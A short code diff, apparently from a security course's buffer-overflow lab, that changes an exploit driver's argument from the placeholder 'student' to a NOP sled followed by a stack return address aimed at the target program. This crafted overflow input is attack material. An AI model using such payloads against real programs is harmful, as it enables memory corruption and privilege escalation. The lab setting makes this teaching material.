@@ -11,9 +11,9 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
+
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9f\xff\xff\xbf";
   args[2] = NULL;
   
   env[0] = NULL;
